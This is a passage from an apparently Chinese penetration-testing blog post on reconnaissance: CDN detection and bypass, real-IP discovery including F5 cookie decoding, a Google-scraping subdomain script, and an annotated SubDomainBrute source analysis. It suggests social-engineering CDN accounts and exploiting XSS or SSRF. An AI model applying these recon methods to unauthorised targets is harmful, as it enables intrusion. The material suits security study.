By\n\n\n# write to file\ndef write_file(file_path, content):\n    try:\n        with open(file_path, 'a', encoding='utf-8') as file:\n            file.write(content + '\\n')\n        return True\n    except Exception as e:\n        print(e)\n        return False\n\n\n# signal handler\ndef signal_handler(sig, frame):\n    print(\"\\nuser pause\")\n    sys.exit(0)\n\n\n# init selenium\ndef setup_driver():\n    options = webdriver.ChromeOptions()\n    options.add_argument(\"--headless\")\n    return webdriver.Chrome(options=options)\n\n\n# get domain in links\ndef extract_domain(link):\n    match = re.search(r\"https://(.*?)/\", link)\n    if match:\n        return match.group(1)\n    return None\n\n\n# fetch links from result\ndef fetch_links(driver, domain, page):\n    url = f\"https://www.google.com/search?q=site:{domain}&start={page}0\"\n    driver.get(url)\n\n    try:\n        elements = driver.find_elements(By.CSS_SELECTOR, \"#rso .kb0PBd.A9Y9g.jGGQ5e span > a\")\n        links = []\n        for element in elements:\n            link = element.get_attribute(\"href\")\n            if link:\n                links.append(link)\n        return links\n    except Exception as e:\n        print(f\"failed to fetch links: {e}\")\n        return []\n\n\n# main\ndef main():\n    # signal init\n    signal.signal(signal.SIGINT, signal_handler)\n\n    # parse user input\n    parser = argparse.ArgumentParser(description=\"Chrome search script\")\n    parser.add_argument(\"-d\", \"--domain\", required=True, help=\"The domain to search\")\n    parser.add_argument(\"-m\", \"--maxpage\", type=int, required=True, help=\"The maximum number to search\")\n    args = parser.parse_args()\n\n    # parameter assignment\n    domain = args.domain\n    max_page = args.maxpage\n\n    # init driver\n    driver = setup_driver()\n\n    # remove duplicates\n    unique_links = set()\n\n    # Start crawling from the first page\n    for page in range(0, max_page + 1):\n        links = fetch_links(driver, domain, page)\n\n        # Traverse links, extract and save unique domain names\n        for link in links:\n            domain_name = extract_domain(link)\n            if domain_name and domain_name not in unique_links:\n                unique_links.add(domain_name)\n                print(domain_name)\n                write_file(\"domain.txt\", domain_name)\n\n    # close driver\n    driver.quit()\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n**资产测绘工具搜集**\n\n使用资产测绘工具收集，如**fofa、hunter、360quake、微步**等，包括使用站长之家等等。\n\n![img](https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241122163631.png)\n\n**使用自动化工具**\n\n这里对两种开源的工具进行源码分析，了解其原理\n\n#### **SubDomainBrute源码分析**\n\n这里只分析主要代码\n\n```python\n# 加载DNS服务器地址\ndef load_dns_servers():\n    print_msg('[+] Validate DNS servers', line_feed=True)\n    dns_servers = []\n\n    servers_to_test = []\n    # 从字典中加载未被注释的DNS服务器地址\n    for server in open(os.path.join(root_path, 'dict/dns_servers.txt')).readlines():\n        server = server.strip()\n        if server and not server.startswith('#'):\n            servers_to_test.append(server)\n\n\t# 异步验证DNS服务器，dns_servers为传入的空列表，保存验证通过的DNS服务器地址\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(async_load_dns_servers(servers_to_test, dns_servers))\n\n    # 打印有效DNS服务器地址\n    server_count = len(dns_servers)\n    print_msg('\\n[+] %s DNS Servers found' % server_count, line_feed=True)\n    if server_count == 0:\n        print_msg('[ERROR] No valid DNS Server !', line_feed=True)\n        sys.exit(-1)\n    return dns_servers\n\n# 加载子域名爆破字典\ndef load_next_sub(full_scan):\n    next_subs = []\n    # 根据full_scan参数判断加载哪个字典\n    _file = 'dict/next_sub_full.txt' if full_scan else 'dict/next_sub.txt'\n    \n    # 将子域名去重后存入临时集合tmp_set\n    with open(os.path.join(root_path, _file)) as f:\n        for line in f:\n            sub = line.strip()\n            if sub and sub not in next_subs:\n                tmp_set = {sub}\n                \n                # 如果子域名模块包含占位符，如{alphnum}，则进行替换操作\n                while tmp_set:\n                    item = tmp_set.pop()\n                    if item.find('{alphnum}') >= 0:\n                        for _letter in 'abcdefghijklmnopqrstuvwxyz0123456789':\n                            tmp_set.add(item.replace('{alphnum}', _letter, 1))\n                    elif item.find('{alpha}') >= 0:\n                        for _letter in 'abcdefghijklmnopqrstuvwxyz':\n                            tmp_set.add(item.replace('{alpha}', _letter, 1))\n                    elif item.find('{num}') >= 0:\n                        for _letter in '0123456789':\n                            tmp_set.add(item.replace('{num}', _letter, 1))\n                    elif item not in next_subs:\n                        next_subs.append(item)\n    return next_subs\n```\n\n加载字典的功能中，使用占位符的方式让这个工具更加灵活，字典文件更加通用，并且通过这个方式可以轻松生成大规模的子域名。\n\n在子域名中还存在一个**泛解析**的问题，这个工具里面解决了这个问题\n\n```python\nasync def async_wildcard_test(domain, dns_servers, level=1):\n    try:\n        # 创建异步DNS解析器\n        r = dns.asyncresolver.Resolver()\n        # 使用DNS服务器解析域名\n        r.nameservers = dns_servers\n        # 使用异步DNS查询解析A记录，lijiejie-not-existed-test是一个随机的子域名，理论上不存在\n        answers = await r.resolve('lijiejie-not-existed-test.%s' % domain, 'A', lifetime=10)\n        # 如果解析成功，讲这些IP手机在ips中，如果解析的IP有效，可能意味着域名启用了通配符解析\n        ips = ', '.join(sorted([answer.address for answer in answers]))\n        # 初步检测，生成一个子域名，并递归调用进一步检测，并将level设置为2\n        if level == 1:\n            print('any-sub.%s\\t%s' % (domain.ljust(30), ips))\n            await async_wildcard_test('any-sub.%s' % domain, dns_servers, 2)\n        # 打印提示信息，使用-w参数强制扫描通配符域名\n        elif level == 2:\n            print('\\nUse -w to enable force scan wildcard domain')\n            sys.exit(0)\n    except Exception as e:\n        return domain\n\ndef wildcard_test(domain, dns_servers):\n    # 获取当前的异步事件循环\n    loop = asyncio.get_event_loop()\n    # 等待异步任务完成\n    return loop.run_until_complete(\n        # 并行执行多个异步任务，并返回它们的结果\n        asyncio.gather(\n            async_wildcard_test(domain, dns_servers, level=1)\n        )\n    )[0]\n```\n\n通过给出一个不存在的域名检测，判断是否开启了泛解析\n\n接下来看看扫描模块\n\n```python\n# 爆破模块\nclass SubNameBrute(object):\n    # 初始化\n    def __init__(self, *params):\n        # 提取传入参数\n        self.domain, self.options, self.process_num, self.dns_servers, self.next_subs, \\\n            self.scan_count, self.found_count, self.queue_size_array, tmp_dir = params\n        self.dns_count = len(self.dns_servers)\n        self.scan_count_local = 0\n        self.found_count_local = 0\n        # 初始化DNS解析器\n        self.resolvers = [dns.asyncresolver.Resolver(configure=False) for _ in range(self.options.threads)]\n        for r in self.resolvers:\n            # 解析事件\n            r.lifetime = 6.0\n            # 超时时间\n            r.timeout = 10.0\n        # 优先队列和状态变量\n        self.queue = PriorityQueue()\n        self.ip_dict = {}\n        self.found_subs = set()\n        self.cert_subs = set()\n        self.timeout_subs = {}\n        self.no_server_subs = {}\n        self.count_time = time.time()\n        # 输出日志到文件\n        self.outfile = open('%s/%s_part_%s.txt' % (tmp_dir, self.domain, self.process_num), 'w')\n        self.normal_names_set = set()\n        self.lock = asyncio.Lock()\n        # 线程状态\n        self.threads_status = ['1'] * self.options.threads\n\n    # 加载子域名字典\n    async def load_sub_names(self):\n        normal_lines = []\n        wildcard_lines = []\n        wildcard_set = set()\n        regex_list = []\n        lines = set()\n        # 打开文件逐行读取子域名，跳过空行或重复子域名\n        with open(self.options.file) as inFile:\n            for line in inFile.readlines():\n                sub = line.strip()\n                if not sub or sub in lines:\n                    continue\n                lines.add(sub)\n\n                # 判断子域名是否含占位符\n                brace_count = sub.count('{')\n                if brace_count > 0:\n                    wildcard_lines.append((brace_count, sub))\n\t\t\t\t\t# 占位符处理\n                    sub = sub.replace('{alphnum}', '[a-z0-9]')\n                    sub = sub.replace('{alpha}', '[a-z]')\n                    sub = sub.replace('{num}', '[0-9]')\n                    # 去重\n                    if sub not in wildcard_set:\n                        wildcard_set.add(sub)\n                        regex_list.append('^' + sub + '$')\n                else:\n                    # 普通子域名直接加入列表\n                    normal_lines.append(sub)\n                    self.normal_names_set.add(sub)\n\n        if regex_list:\n            pattern = '|'.join(regex_list)\n            _regex = re.compile(pattern)\n            for line in normal_lines:\n                if _regex.search(line):\n                    normal_lines.remove(line)\n\t\t\n        # 普通子域名加入队列，优先级为0\n        for _ in normal_lines[self.process_num::self.options.process]:\n            await self.queue.put((0, _))    # priority set to 0\n        \n        # 含占位符的子域名直接加入队列\n        for _ in wildcard_lines[self.process_num::self.options.process]:\n            await self.queue.put(_)\n\n    # 检测进程状态\n    async def update_counter(self):\n        while True:\n            if '1' not in self.threads_status:\n                return\n            self.scan_count.value += self.scan_count_local\n            self.scan_count_local = 0\n            self.queue_size_array[self.process_num] = self.queue.qsize()\n            if self.found_count_local:\n                self.found_count.value += self.found_count_local\n                self.found_count_local = 0\n            self.count_time = time.time()\n            await asyncio.sleep(0.5)\n\n    # 检测目标域名的SSL/TLS证书的扩展信息，提取符合条件的子域名\n    async def check_https_alt_names(self, domain):\n        try:\n            # 建立异步HTTPS连接\n            reader, _ = await asyncio.open_connection(\n                host=domain,\n                port=443,\n                ssl=True,\n                server_hostname=domain,\n            )\n            # 获取证书详细信息\n            for item in reader._transport.get_extra_info('peercert')['subjectAltName']:\n                if item[0].upper() == 'DNS':\n                    name = item[1].lower()\n                    # 筛选符合条件的子域名\n                    if name.endswith(self.domain):\n                        sub = name[:len(name) - len(self.domain) - 1]    # new sub\n                        sub = sub.replace('*', '')\n                        sub = sub.strip('.')\n                        # 去重并添加到任务队列\n                        if sub and sub not in self.found_subs and \\\n                                sub not in self.normal_names_set and sub not in self.cert_subs:\n                            self.cert_subs.add(sub)\n                            await self.queue.put((0, sub))\n        except Exception as e:\n            pass\n\n\n    # 查询DNS解析结果，并限制查询的超时时间\n    async def do_query(self, j, cur_domain):\n        async with timeout(10.2):\n            return await self.resolvers[j].resolve(cur_domain, 'A')\n\n    # 扫描\n    async def scan(self, j):\n        # 设置DNS解析器\n        self.resolvers[j].nameservers = [self.dns_servers[j % self.dns_count]]\n        if self.dns_count > 1:\n            while True:\n                s = random.choice(self.dns_servers)\n                if s != self.dns_servers[j % self.dns_count]:\n                    self.resolvers[j].nameservers.append(s)\n                    break\n        empty_counter = 0\n        \n        # 处理子域\n        while True:\n            try:\n                brace_count, sub = self.queue.get_nowait()\n                self.threads_status[j] = '1'\n                empty_counter = 0\n            except asyncio.queues.QueueEmpty as e:\n                empty_counter += 1\n                if empty_counter > 10:\n                    self.threads_status[j] = '0'\n                if '1' not in self.threads_status:\n                    break\n                else:\n                    await asyncio.sleep(0.1)\n                    continue\n\n            # 对于带有通配符的子域进行处理\n            if brace_count > 0:\n                brace_count -= 1\n                if sub.find('{next_sub}') >= 0:\n                    for _ in self.next_subs:\n                        await self.queue.put((0, sub.replace('{next_sub}', _)))\n                if sub.find('{alphnum}') >= 0:\n                    for _ in 'abcdefghijklmnopqrstuvwxyz0123456789':\n                        await self.queue.put((brace_count, sub.replace('{alphnum}', _, 1)))\n                elif sub.find('{alpha}') >= 0:\n                    for _ in 'abcdefghijklmnopqrstuvwxyz':\n                        await self.queue.put((brace_count, sub.replace('{alpha}', _, 1)))\n                elif sub.find('{num}') >= 0:\n                    for _ in '0123456789':\n                        await self.queue.put((brace_count, sub.replace('{num}', _, 1)))\n                continue\n\n            try:\n                if sub in self.found_subs:\n                    continue\n\n                self.scan_count_local += 1\n                cur_domain = sub + '.' + self.domain\n\n                # 执行DNS查询\n                answers = await self.do_query(j, cur_domain)\n                \n                # 处理DNS查询结果，排除无效IP\n                if answers:\n                    self.found_subs.add(sub)\n                    ips = ', '.join(sorted([answer.address for answer in answers]))\n                    invalid_ip_found = False\n                    for answer in answers:\n                        if answer.address in ['1.1.1.1', '127.0.0.1', '0.0.0.0', '0.0.0.1']:\n                            invalid_ip_found = True\n                    if invalid_ip_found:\n                        continue\n                    if self.options.i and is_intranet(answers[0].host):\n                        continue\n\n                    try:\n                        # 查询CNAME记录\n                        cname = str(answers.canonical_name)[:-1]\n                        if cname != cur_domain and cname.endswith(self.domain):\n                            cname_sub = cname[:len(cname) - len(self.domain) - 1]    # new sub\n                            if cname_sub not in self.found_subs and cname_sub not in self.normal_names_set:\n                                await self.queue.put((0, cname_sub))\n                    except Exception as e:\n                        pass\n\n                    first_level_sub = sub.split('.')[-1]\n                    max_found = 20\n\n                    if self.options.w:\n                        first_level_sub = ''\n                        max_found = 3\n\n                    if (first_level_sub, ips) not in self.ip_dict:\n                        self.ip_dict[(first_level_sub, ips)] = 1\n                    else:\n                        self.ip_dict[(first_level_sub, ips)] += 1\n                        if self.ip_dict[(first_level_sub, ips)] > max_found:\n                            continue\n\n                    self.found_count_local += 1\n\n                    # 将查询结果写入文件\n                    self.outfile.write(cur_domain.ljust(30) + '\\t' + ips + '\\n')\n                    self.outfile.flush()\n\n                    # 检查HTTPS证书\n                    if not self.options.no_cert_check:\n                        async with timeout(10.0):\n                            await self.check_https_alt_names(cur_domain)\n\n                    try:\n                        self.scan_count_local += 1\n                        await self.do_query(j, 'lijiejie-test-not-existed.' + cur_domain)\n\n                    except dns.resolver.NXDOMAIN as e:\n                        if self.queue.qsize() < 20000:\n                            for _ in self.next_subs:\n                                await self.queue.put((0, _ + '.' + sub))\n                        else:\n                            await self.queue.put((1, '{next_sub}.' + sub))\n                    except Exception as e:\n                        continue\n\n            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer) as e:\n                pass\n            except dns.resolver.NoNameservers as e:\n                self.no_server_subs[sub] = self.no_server_subs.get(sub, 0) + 1\n                if self.no_server_subs[sub] <= 3:\n                    await self.queue.put((0, sub))    # Retry again\n            except (dns.exception.Timeout, dns.resolver.LifetimeTimeout) as e:\n                self.timeout_subs[sub] = self.timeout_subs.get(sub, 0) + 1\n                if self.timeout_subs[sub] <= 3:\n                    await self.queue.put((0, sub))    # Retry again\n            except Exception as e:\n                if str(type(e)).find('asyncio.exceptions.TimeoutError') < 0:\n                    with open('errors.log', 'a') as errFile:\n                        errFile.write('[%s] %s\\n' % (type(e), str(e)))\n\n    async def async_run(self):\n        await self.load_sub_names()\n        tasks = [self.scan(i) for i in range(self.options.threads)]\n        tasks.insert(0, self.update_counter())\n        await asyncio.gather(*tasks)\n\n    def run(self):\n        loop = asyncio.get_event_loop()\n        asyncio.set_event_loop(loop)\n        loop.run_until_complete(self.async_run())\n\ndef run_process(*params):\n    # 信号处理器\n    signal.signal(signal.SIGINT, user_abort)\n    # 调用SubNameBrute的run方法\n    s = SubNameBrute(*params)\n    s.run()\n\n# 根据option.process启动多个进程\nfor process_num in range(options.process):\n    p = multiprocessing.Process(\n        # 调用run_process进行扫描\n        target=run_process,\n        args=(domain, options, process_num, dns_servers, next_subs,\n              scan_count, found_count, queue_size_array, tmp_dir)\n    )\n    all_process.append(p)\n    p.start()\n```\n\n总体的工作路径为：\n\n- **加载子域名**：从文件中读取子域名，识别通配符，放入任务队列\n- 扫描子域\n  - 多线程扫描子域\n  - 对每个子域执行DNS查询，处理返回结果\n  - 对子域名进行证书检查，CNAME解析等附加操作\n- **记录结果**\n- **错误处理与重试**：对于DNS查询失败的子域进行重试，最多三次\n\n这里有个证书检查和CNAME解析，还有一个称呼叫**证书透明度**主要原因是**提高全面性**。在**SSL/TLS**证书中的`subjectAltName`字段会暴露一些隐藏子域。**CNAME**是DNS中的一种记录类别，通常用于将一个域名指向另一个域名，也就是说CNAME可以为某个域名创建一个别名，因此可以去发现隐藏的域名，增加子域名查询的全面性。\n\n**对于通配符子域名的处理**：讲这些子域存在一个集合中，避免重复爆破，根据查询CNAME和MX记录，挖掘更多的子域，并且进行递归查询。\n","slug":"信息收集(TODO)","published":1,"updated":"2025-03-04T14:36:47.269Z","comments":1,"layout":"post","photos":[],"_id":"cm8d9pkht0008lsjf5nws5k3c","content":"<h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><blockquote>\n<p>信息收集是渗透测试中的第一步，也是最为关键的一步。有大佬说过：渗透测试的本质就是信息收集。因此在这里认真钻研一下信息收集部分，包括收集什么？如何收集？自动化工具的原理？也尽量自己在每个模块开发出自己的工具，最终整合成自己的信息收集工具。</p>\n</blockquote>\n<h2 id=\"域名（Domain）\"><a href=\"#域名（Domain）\" class=\"headerlink\" title=\"域名（Domain）\"></a>域名（Domain）</h2><blockquote>\n<p>域名是由一串用点分隔的字符组成的互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位。域名是IP地址的代称，目的是便于记忆。一般渗透都会从一个域名开始，因此由域名开始作为切入口。</p>\n</blockquote>\n<h3 id=\"判断CDN\"><a href=\"#判断CDN\" class=\"headerlink\" title=\"判断CDN\"></a>判断CDN</h3><p>内容分发网络（Content Delivery Network）的基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输更快更稳定。那这对我们渗透测试带来了什么影响呢？</p>\n<p>CDN会代理客户端的请求，将真实服务器的IP地址隐藏，让我们无法直接定位目标服务器，因此需要绕过CDN。</p>\n<p><strong>ping域名判断是否有CDN</strong></p>\n<p>当ping出来的域名为很长一串字符，或者有着很明显的cdn、ali、tencent等字段时大概率存在CDN。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133118.png\" alt=\"img\"></p>\n<p><strong>nslookup判断CDN</strong></p>\n<p>nslookup是一个命令行工具，用于查询Internet域名信息或诊断DNS服务器问题。</p>\n<p>通过nslookup检测一个域名是否对应多个IP可以判断是否使用CDN</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133620.png\" alt=\"img\"></p>\n<p><strong>多地ping判断CDN</strong></p>\n<p><a href=\"https://ping.chinaz.com/\">站长工具</a>还是比较直观的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121133805.png\" alt=\"img\"></p>\n<h3 id=\"查看真实IP\"><a href=\"#查看真实IP\" class=\"headerlink\" title=\"查看真实IP\"></a>查看真实IP</h3><p>检测完CDN，就该绕过CDN检测了，获取真实IP</p>\n<p><strong>多地ping</strong></p>\n<p>不仅是检测CDN，同时也可以用来判断。</p>\n<p>如<code>www.youzan.com</code>，可以发现存在CDN，但是发现在除中国大陆外都是同一个IP，因此可以判断为真实IP</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121134240.png\" alt=\"img\"></p>\n<p><strong>子域名查询真实IP</strong></p>\n<p>CDN并非免费的，成本较大，因此很多公司可能只对主站或者访问量较大的站做了CDN加速。因此可以通过获取子域名来查询真实IP，查询方式可以利用上述多地ping方法。子域名收集在后面单独讲。</p>\n<p><strong>DNS历史记录</strong></p>\n<p>查看IP与域名绑定的历史记录，可能存在使用CDN前的解析记录，<a href=\"https://viewdns.info/\">Viewdns</a>或者之前的开发工具都可以查询</p>\n<p><strong>SSL证书</strong></p>\n<p>加入web服务器支持SSL并具有证书，在端口443直接访问时，SSL证书就会被暴露。此时攻击者会看见一个使用特定证书的IPv4主机列表，真实IP就在其中。</p>\n<p><strong>漏洞查找</strong></p>\n<ul>\n<li>敏感文件泄露，如phpinfo等，github信息泄露等。</li>\n<li>XSS、命令执行、SSRF等。</li>\n<li>社工等手段，拿到目标管理员在CDN账号，可以在CDN配置找到。</li>\n</ul>\n<p><strong>网站邮件</strong></p>\n<p>很多网站都自带<code>sendmail</code>，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实IP</p>\n<p><strong>F5 LTM解码</strong></p>\n<p>当服务器使用FT5 LTM做负载均衡的时候，对set-cookie关键字解码也可以获取真实IP</p>\n<figure class=\"highlight dns\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-Cookie: BIGipServerpool_<span class=\"number\">8.29_8030</span>=<span class=\"number\">487098378</span>.<span class=\"number\">24095.0000</span></span><br><span class=\"line\">先把第一小节的十进制数取出来：<span class=\"number\">487098378</span></span><br><span class=\"line\">再转化为十六进制数：<span class=\"number\">1d</span>08880a</span><br><span class=\"line\">从后至前取四位数：<span class=\"number\">0</span>a.<span class=\"number\">88</span>.<span class=\"number\">08</span>.<span class=\"number\">1d</span></span><br><span class=\"line\">转化为十进制即为IP：<span class=\"number\">10.136.8.29</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"子域名收集\"><a href=\"#子域名收集\" class=\"headerlink\" title=\"子域名收集\"></a>子域名收集</h3><p>在前面查看真实IP的地方提到了子域名收集，子域名收集不只是为了找真实IP服务，更是为了扩大资产收集范围。</p>\n<p><strong>搜索引擎收集</strong></p>\n<p>使用谷歌语法等可以收集大量信息，如<code>site:domain</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Squarehhh/DrawingBed/myblog/20241121143338.png\" alt=\"img\"></p>\n<p>尝试自己写了个基于Chrome搜索的脚本，爬取效果还是不错的，后面看看能不能增加功能</p>\n<figure class=\"highlight python\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> signal</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.common.by <span class=\"keyword\">import</span> By</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># write to file</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write_file</span>(<span class=\"params\">file_path, content</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_path, <span class=\"string\">'a'</span>, encoding=<span class=\"string\">'utf-8'</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">            file.write(content + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(e)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># signal handler</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">signal_handler</span>(<span class=\"params\">sig, frame</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">\"\\nuser pause\"</span>)</span><br><span class=\"line\">    sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># init selenium</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">setup_driver</span>():</span><br><span class=\"line\">    options = webdriver.ChromeOptions()</span><br><span class=\"line\">    options.add_argument(<span class=\"string\">\"--headless\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> webdriver.Chrome(options=options)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get domain in links</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">extract_domain</span>(<span class=\"params\">link</span>):</span><br><span class=\"line\">    <span class=\"keyword\">match</span> = re.search(<span class=\"string\">r\"https://(.*?)/\"</span>, link)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">match</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">match</span>.group(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fetch links from result</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">fetch_links</span>(<span class=\"params\">driver, domain, page</span>):</span><br><span class=\"line\">    url = <span class=\"string\">f\"https://www.google.com/search?q=site:<span class=\"subst\">{domain}</span>&amp;start=<span class=\"subst\">{page}</span>0\"</span></span><br><span class=\"line\">    driver.get(url)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        elements = driver.find_elements(By.CSS_SELECTOR, <span class=\"string\">\"#rso .kb0PBd.A9Y9g.jGGQ5e span &gt; a\"</span>)</span><br><span class=\"line\">        links = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> element <span class=\"keyword\">in</span> elements:</span><br><span class=\"line\">            link = element.get_attribute(<span class=\"string\">\"href\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> link:</span><br><span class=\"line\">                links.append(link)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> links</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f\"failed to fetch links: <span class=\"subst\">{e}</span>\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> []</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># main</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    <span class=\"comment\"># signal init</span></span><br><span class=\"line\">    signal.signal(signal.SIGINT, signal_handler)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># parse user input</span></span><br><span class=\"line\">    parser = argparse.ArgumentParser(description=<span class=\"string\">\"Chrome search script\"</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">\"-d\"</span>, <span class=\"string\">\"--domain\"</span>, required=<span class=\"literal\">True</span>, <span class=\"built_in\">help</span>=<span class=\"string\">\"The domain to search\"</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">\"-m\"</span>, <span class=\"string\">\"--maxpage\"</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>, required=<span class=\"literal\">True</span>, <span class=\"built_in\">help</span>=<span class=\"string\">\"The maximum number to search\"</span>)</span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># parameter assignment</span></span><br><span class=\"line\">    domain = args.domain</span><br><span class=\"line\">    max_page = args.maxpage</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># init driver</span></span><br><span class=\"line\">    driver = setup_driver()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># remove duplicates</span></span><br><span class=\"line\">    unique_links = <span class=\"built_in\">set</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># Start crawling from the first page</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> page <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, max_page + <span class=\"number\">1</span>):</span><br><span class=\"line\">        